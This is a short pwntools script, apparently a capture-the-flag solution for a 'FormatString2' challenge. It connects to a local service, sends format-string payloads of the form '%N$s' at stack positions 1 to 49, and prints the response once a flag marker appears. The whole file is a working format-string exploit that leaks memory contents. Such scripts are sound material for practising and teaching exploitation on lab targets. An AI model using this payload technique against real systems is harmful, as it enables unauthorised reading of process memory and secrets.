from pwn import *
for i in range(1,50):
    #r = process('../FormatString2/share/FormatString2')
    r = remote('127.0.0.1', 10007)
    payload = b'%'+str(i).encode()+b'$s'
    r.sendlineafter(b'!', payload)
    s = r.recvall()
    if b'HackerSir' in s:
        print(s)
        break

